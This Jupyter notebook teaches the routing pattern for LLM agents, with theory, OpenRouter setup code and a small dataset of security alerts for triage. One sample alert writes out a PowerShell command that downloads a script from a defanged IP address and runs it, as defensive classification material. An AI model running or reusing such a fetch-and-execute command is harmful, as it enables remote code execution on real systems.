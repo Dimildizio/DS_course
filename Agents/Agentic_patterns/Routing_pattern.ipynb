{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO+uabrxTR5GqMDqg4uUwSZ",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Dimildizio/DS_course/blob/main/Agents/Agentic_patterns/Routing_pattern.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Routing Pattern\n",
        "\n",
        "**Core AI pattern:** chooses the right path (prompt, tool, model, or chain) for each input.\n",
        "\n",
        "Boosts accuracy, lowers cost/latency, and keeps outputs consistent by **sending different problems to different specialists**.\n",
        "\n",
        "Essential for agents that must decide what to do next before doing it.\n",
        "\n",
        "Building block for tool-use, multi-expert systems, and safe fallbacks."
      ],
      "metadata": {
        "id": "HYRjFKph4V99"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Theory"
      ],
      "metadata": {
        "id": "P_FxUTv_4jGq"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### What is it?\n",
        "\n",
        "A **router** inspects an input and **dispatches** it **to** the best **handler**:\n",
        "\n",
        "- Different prompts (e.g., “SQL Expert” vs “Email Writer”)\n",
        "\n",
        "- Different tools (calculator, web search, vector DB)\n",
        "\n",
        "- Different models (small/cheap vs large/accurate)\n",
        "\n",
        "- Different sub-chains (RAG flow vs generation-only, etc)\n",
        "\n",
        "The router can be **rule-based, ML/embedding-based, LLM-as-classifier, or hybrid.**"
      ],
      "metadata": {
        "id": "FfmWFEO748NM"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Why It Matters?\n",
        "\n",
        "**One-size-fits-all prompts** waste tokens and **underperform** because:\n",
        "\n",
        "- Tasks have heterogeneous structure and constraints.\n",
        "\n",
        "- Some cases need tools, others don't.\n",
        "\n",
        "- Many inputs are easy (use small model), some are hard (escalate).\n",
        "\n",
        "- Safety/compliance may require blocking or escalation.\n",
        "\n",
        "\n",
        "#### Routing improves:\n",
        "\n",
        "- Accuracy: expert prompts beat generic ones.\n",
        "\n",
        "- Cost/Latency: cheap paths for easy cases; heavy paths only when needed.\n",
        "\n",
        "- Safety: detect disallowed/PII-sensitive inputs and abstain or handoff."
      ],
      "metadata": {
        "id": "jya-a87A5QIb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Key Components\n",
        "\n",
        "**Classifier / Gating**\n",
        "\n",
        "- Rules: regex/keywords, heuristics, schema checks.\n",
        "- Embeddings/ML: nearest-neighbor to labeled routes, lightweight classifiers.\n",
        "- LLM-as-Router: single JSON decision (route, confidence, rationale).\n",
        "- Hybrid: rules first (fast/safe), then LLM when uncertain.\n",
        "\n",
        "**Targets (Experts)**\n",
        "\n",
        "- Prompts, tools, models, or full chains with clear contracts (input/output schema).\n",
        "\n",
        "**Unification Layer**\n",
        "\n",
        "- Normalize outputs across branches (e.g., a common JSON envelope) so downstream code stays simple.\n",
        "\n",
        "**Confidence & Fallbacks**\n",
        "\n",
        "- Thresholds, tie-breakers, \"unknown/abstain,\" human-in-the-loop, or a generalist path.\n",
        "\n",
        "**Observability**\n",
        "\n",
        "- Route logs, confusion matrix, coverage/precision, cost & latency per route.\n",
        "\n",
        "**Policy & Safety**\n",
        "\n",
        "- Guardrails pre- and post-route (blocklists, PII detection, content policies)."
      ],
      "metadata": {
        "id": "ofuiD9845yI3"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Practical Use Cases\n",
        "\n",
        "- Customer support triage: billing vs tech vs account -> distinct prompts/RAG corpora.\n",
        "- Code assistant: detect language (Py/JS/SQL) -> language-specific prompts & unit-testers.\n",
        "- Doc extraction: detect doc type (invoice, receipt, ID) -> specialized parsers/schemata as tool.\n",
        "- RAG index selection: pick the right knowledge base or retriever per query.\n",
        "- Tool choice (I'd say most obvious): math -> calculator; current events -> web; entity lookup -> DB.\n",
        "- Multilingual: route by language to locale-tuned prompts/models.\n",
        "- Security: alert/IOC triage -> malware vs phishing vs misconfig paths; escalate unknowns."
      ],
      "metadata": {
        "id": "cYZupEgJ6VWT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Tricks, pieces of advice and things to consider\n",
        "\n",
        "**Design choice**: Rules vs ML/embeddings vs LLM-as-router\n",
        "\n",
        "- Rules (regex/heuristics): Fast, cheap, transparent.\n",
        "- ML / Embeddings classifier: Train a lightweight model (or use nearest-neighbor on embeddings) to map inputs -> routes.\n",
        "- LLM-as-router: Ask an LLM to return `{route: \"...\", confidence: 0–1, rationale: \"...\"}`, however in practice LLM would likely return 0.3 for not sure, 0.9 for high confidence so it really feels binary\n",
        "- Hybrid (in practice wins in most cases): Rules first (block obvious, fast wins) -> embeddings/ML if uncertain -> LLM only when confidence is low or case is novel.\n",
        "\n",
        "**Contract**: Keep branch outputs schema-aligned.\n",
        "\n",
        "- What: Every branch should return the same envelope so downstream code doesn’t care which path ran.\n",
        "- Why: Simplifies integration, logging, and evaluation.\n",
        "- How: Validate with Pydantic (or Marshmallow) and reject/repair non-conforming outputs.\n",
        "\n",
        "\n",
        "**Safety**: Always include block/abstain and human handoff. The router must be able to say \"don't answer\" and escalate.\n",
        "\n",
        "- Blocklist / policy gates (pre-route): `disallowed content -> {route:\"blocked\", reason:\"pii_detected\"}`.\n",
        "- Abstain on low-confidence: If `confidence < threshold -> {route:\"abstain\"}` and trigger fallback (generalist model) or human triage.\n",
        "- Post-route checks: Scan generated outputs (hallucination detector, SQL safety linter). If fails -> auto-revise or escalate.\n",
        "- Metadata to keep: `reason`, `policy_category`, `recommended_action: \"escalate|revise|drop\"`.\n",
        "-Obviously do not forget to escalate and return.\n",
        "For example:\n",
        "```\n",
        "{ \"route\":\"abstain\", \"confidence\":0.42, \"reason\":\"ambiguous intent\", \"handoff\":\"human_security_analyst\" }\n",
        "```\n",
        "\n",
        "**Ops**: Track route quality and adjust thresholds, cache easy decisions.\n",
        "\n",
        "Treat routing like a model-measure and tune it.\n",
        "\n",
        "- Metrics to log\n",
        "\n",
        "  - Coverage per route (% of traffic).\n",
        "  - Accuracy/Success per route (task-specific score).\n",
        "  - Confusion matrix (where the router picked A but ground truth was B).\n",
        "  - Latency & cost per route.\n",
        "  - Abstain rate and escalation outcomes.\n",
        "\n",
        "- Threshold tuning\n",
        "\n",
        "  - Pick confidence threshold per route to maximize a cost-aware objective. (Might be tricky to choose how).\n",
        "\n",
        "- Caching\n",
        "\n",
        "  - ALWAYS take into account KV-cache since depending on context window it could eat way more vRAM than the model itself. Use KV budgets, eviction tiers, and route-aware policies to keep VRAM stable. Alternatives to KV-cache - prefix KV cache (bounded), response cache (exact matches), retrieval/embedding cache (to reduce prompt length next time).\n",
        "  - Cache final answers and shared prefixes, not full user contexts.\n",
        "  - Normalize input -> compute a routing key (for example hash of lemmatized text).\n",
        "  - If seen before with high confidence, reuse route (and even final answer if safe).\n",
        "  - Great for FAQs and repeated queries -> slashes latency/cost.\n",
        "\n"
      ],
      "metadata": {
        "id": "28nHEt2-7LDV"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## TL;DR\n",
        "\n",
        "**What**: A decision layer that routes inputs to the best expert path.\n",
        "\n",
        "**Why**: Higher accuracy with lower cost/latency and better safety.\n",
        "\n",
        "**Rule of Thumb**: Use routing when tasks are heterogeneous, tools/models differ by case, or you need abstain/escalation behavior."
      ],
      "metadata": {
        "id": "ijLt7ury6xO6"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Practice"
      ],
      "metadata": {
        "id": "upixbTSBQUwx"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Set up"
      ],
      "metadata": {
        "id": "GgV_CPHDRNJ7"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os, json, re, time, math, hashlib\n",
        "import requests\n",
        "import numpy as np\n",
        "\n",
        "\n",
        "OPENROUTER_API_KEY = userdata.get('openrouter')\n",
        "\n",
        "BASE_URL = \"https://openrouter.ai/api/v1/chat/completions\"\n",
        "HEADERS = {\"Authorization\": f\"Bearer {OPENROUTER_API_KEY}\"}\n",
        "\n",
        "MODEL_ROUTER = \"qwen/qwen3-30b-a3b:free\"\n",
        "MODEL_EXPERT = \"mistralai/mistral-small-3.2-24b-instruct:free\"\n"
      ],
      "metadata": {
        "id": "71Ya-52cQXov"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Dataset example"
      ],
      "metadata": {
        "id": "vN9ww89WRWsw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "TEST_ALERTS = [\n",
        "  (\"phishing\", \"\"\"User reports email urging immediate password reset. Link goes to login-acme-security[.]com, DKIM fails. Message requests MFA backup codes.\"\"\"),\n",
        "  (\"malware\", \"\"\"EDR flagged PowerShell: iwr hxxp://185.203.116.44/upd.ps1 -o C:\\\\Users\\\\Public\\\\upd.ps1; start-process. File hash 9f2c...e12. Beacon-like 60s jitter.\"\"\"),\n",
        "  (\"misconfig\", \"\"\"CloudTrail shows s3://acme-data set to public-read. No IOCs; finding is CIS-3.1 noncompliance.\"\"\"),\n",
        "  (\"blocked\", \"\"\"Email contains full card: 4111-1111-1111-1111 exp 12/27. Requesting storage in helpdesk ticket.\"\"\"),\n",
        "  (\"unknown\", \"\"\"Potential lateral movement from srv-db-03 to srv-erp-02. Insufficient details to classify.\"\"\")]\n"
      ],
      "metadata": {
        "id": "ALoDoRXORbK6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Call func"
      ],
      "metadata": {
        "id": "yI_4pgKtRRYB"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def call(model, messages, **kw):\n",
        "    payload = {\"model\": model, \"messages\": messages, **kw}\n",
        "    r = requests.post(BASE_URL, headers=HEADERS, json=payload, timeout=60)\n",
        "    r.raise_for_status()\n",
        "    return r.json()[\"choices\"][0][\"message\"][\"content\"]"
      ],
      "metadata": {
        "id": "OdcvBOgSRDVo"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}